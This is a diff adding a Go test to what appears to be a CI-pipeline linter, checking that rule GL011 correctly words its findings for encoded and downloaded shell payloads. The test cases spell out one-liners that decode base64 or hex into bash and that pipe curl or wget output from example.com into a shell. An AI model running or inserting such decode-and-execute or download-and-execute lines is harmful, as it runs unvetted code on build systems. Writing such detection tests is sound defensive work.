@@ -112,6 +112,30 @@ setup:
 	}
 }
 
+func TestGL011_EncodedPayloadMessageDoesNotClaimDownload(t *testing.T) {
+	for _, tc := range []struct {
+		name, line, want string
+	}{
+		{"inline base64", `echo "ZWNobyBwd25lZAo=" | base64 -d | bash`, "decodes and executes"},
+		{"CI variable base64", `echo "$SETUP_B64" | base64 -d | sh`, "decodes and executes"},
+		{"file variable base64", `base64 -d < $SETUP_B64 | bash`, "decodes and executes"},
+		{"inline hex", `echo 6375726c2e2e2e | xxd -r -p | bash`, "decodes and executes"},
+		{"inline hex escapes", `printf '\x63\x75\x72\x6c' | sh`, "decodes and executes"},
+		{"download through decoder", `curl -fsSL https://example.com/install.b64 | base64 -d | bash`, "downloads and executes"},
+		{"direct download", `wget -qO- https://example.com/install.sh | sh`, "downloads and executes"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			f := findings011(t, "job:\n  script:\n    - "+strconv.Quote(tc.line)+"\n")
+			if len(f) != 1 || f[0].RuleID != "GL011" || f[0].Severity != finding.Error || f[0].Line != 3 || !strings.Contains(f[0].Message, tc.want) {
+				t.Fatalf("expected %q GL011 error on line 3, got %+v", tc.want, f)
+			}
+			if tc.want == "decodes and executes" && strings.Contains(f[0].Message, "downloads") {
+				t.Errorf("encoded payload finding must not claim a download: %s", f[0].Message)
+			}
+		})
+	}
+}
+
 func TestGL011_DownloadThenExecAnd(t *testing.T) {
 	f := findings011(t, `
 setup:
